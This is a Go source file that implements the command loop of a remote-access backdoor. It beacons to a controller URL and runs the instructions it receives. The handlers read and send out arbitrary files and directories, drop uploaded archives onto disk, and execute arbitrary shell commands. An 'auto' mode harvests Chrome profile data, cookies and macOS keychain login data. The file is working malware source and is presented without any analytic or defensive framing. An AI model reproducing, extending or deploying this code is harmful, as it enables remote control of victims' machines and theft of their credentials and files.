package core

import (
	"bits-project/bits/auto"
	"bits-project/bits/command"
	"bits-project/bits/config"
	"bits-project/bits/transport"
	"bits-project/bits/util"
	"bytes"
	"context"
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func StartMainLoop(id string, url string) {

	var (
		msg_type string
		msg_data [][]byte
		msg      string
		cmd      string
		cmd_type string
		cmd_data [][]byte
		alive    bool
	)

	// initialize
	cmd_type = config.COMMAND_INFO
	alive = true
	for alive {
		func() {

			// recover panic state
			defer func() {
				if r := recover(); r != nil {
					cmd_type = config.COMMAND_INFO
					time.Sleep(config.DURATION_ERROR_WAIT)
				}
			}()

			switch cmd_type {
			case config.COMMAND_INFO:
				msg_type, msg_data = processInfo()
			case config.COMMAND_UPLOAD:
				msg_type, msg_data = processUpload(cmd_data)
			case config.COMMAND_DOWNLOAD:
				msg_type, msg_data = processDownload(cmd_data)
			case config.COMMAND_OSSHELL:
				msg_type, msg_data = processOsShell(cmd_data)
			case config.COMMAND_AUTO:
				msg_type, msg_data = processAuto(cmd_data)
			case config.COMMAND_WAIT:
				msg_type, msg_data = processWait(cmd_data)
			case config.COMMAND_EXIT:
				alive = false
				msg_type, msg_data = processExit()
			default:
				panic("problem")
			}

			msg = command.MakeMsg(id, msg_type, msg_data)
			cmd, _ = transport.HtxpExchange(url, msg)
			cmd_type, cmd_data = command.DecodeMsg(cmd)
		}()
	}
}

func processExit() (string, [][]byte) {
	return config.MSG_LOG, [][]byte{
		[]byte(config.LOG_SUCCESS),
		[]byte("exited"),
	}
}

func processAuto(data [][]byte) (string, [][]byte) {
	var (
		msg_type string
		msg_data [][]byte
	)

	mode := string(data[0])

	switch mode {
	case config.AUTO_CHROME_GATHER:
		msg_type, msg_data = auto.AutoModeChromeGather()
	case config.AUTO_CHROME_PREFRST:
		msg_type, msg_data = auto.AutoModeChromeChangeProfile()
	case config.AUTO_CHROME_COOKIE:
		msg_type, msg_data = auto.AutoModeChromeCookie()
	case config.AUTO_CHROME_KEYCHAIN:
		msg_type, msg_data = auto.AutoModeMacChromeLoginData()
	default:
		msg_type = config.MSG_LOG
		msg_data = [][]byte{[]byte(config.LOG_FAIL), []byte("unknown auto mode")}
	}

	return msg_type, msg_data
}

func processOsShell(data [][]byte) (string, [][]byte) {

	mode := string(data[0]) // mode
	timeout, _ := strconv.ParseInt(string(data[1]), 16, 64)
	shell := string(data[2])
	args := make([]string, len(data[3:]))
	for index, elem := range data[3:] {
		args[index] = string(elem)
	}

	if mode == config.SHELL_MODE_WAITGETOUT { // wait and get result mode

		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout))
		defer cancel()

		cmd := exec.CommandContext(ctx, shell, args...)
		out, err := cmd.Output()

		if err != nil {
			return config.MSG_LOG, [][]byte{
				[]byte(config.LOG_FAIL),
				[]byte(err.Error()),
			}
		} else {
			return config.MSG_LOG, [][]byte{
				[]byte(config.LOG_SUCCESS),
				out,
			}
		}

	} else { // start and detach mode

		c := exec.Command(shell, args...)
		err := c.Start()

		if err != nil {
			return config.MSG_LOG, [][]byte{
				[]byte(config.LOG_FAIL),
				[]byte(err.Error()),
			}
		} else {
			return config.MSG_LOG, [][]byte{
				[]byte(config.LOG_SUCCESS),
				[]byte(fmt.Sprintf("%s %s", shell, strings.Join(args, " "))),
			}
		}
	}

}

func processDownload(data [][]byte) (string, [][]byte) {

	var file_data []byte
	var err error

	path := string(data[0])
	_, file := filepath.Split(path)

	info, _ := os.Stat(path)

	if info.IsDir() {
		var buf bytes.Buffer
		err = util.Compress(&buf, []string{path}, false)

		file = fmt.Sprintf("%s.tar.gz", file)
		file_data = buf.Bytes()

	} else {
		file_data, err = os.ReadFile(path)
	}

	if err == nil {
		return config.MSG_FILE, [][]byte{[]byte(config.LOG_SUCCESS), []byte(file), file_data}
	} else {
		return config.MSG_FILE, [][]byte{[]byte(config.LOG_FAIL), []byte(err.Error())}
	}
}

func processWait(data [][]byte) (string, [][]byte) {

	duration, _ := strconv.ParseInt(string(data[0]), 16, 64)

	time.Sleep(time.Duration(duration))

	send_data := make([]byte, 128)
	rand.Read(send_data)

	return config.MSG_PING, [][]byte{send_data}
}

func processUpload(data [][]byte) (string, [][]byte) {

	var log string
	var state string

	path := string(data[0])
	buf := bytes.NewBuffer(data[1])

	err := util.Decompress(buf, path)

	if err == nil {
		log = fmt.Sprintf("%s : %d", path, len(data[1]))
		state = config.LOG_SUCCESS
	} else {
		log = fmt.Sprintf("%s : %s", path, err.Error())
		state = config.LOG_FAIL
	}

	return config.MSG_LOG, [][]byte{
		[]byte(state),
		[]byte(log),
	}
}

func processInfo() (string, [][]byte) {

	user, _ := user.Current()
	host, _ := os.Hostname()
	os := runtime.GOOS
	arch := runtime.GOARCH

	print("user: " + user.Username + ", host: " + host + ", os: " + os + ", arch: " + arch + "\n")

	data := [][]byte{
		[]byte(user.Username),
		[]byte(host),
		[]byte(os),
		[]byte(arch),
		[]byte(config.DAEMON_VERSION),
	}

	return config.MSG_INFO, data
}
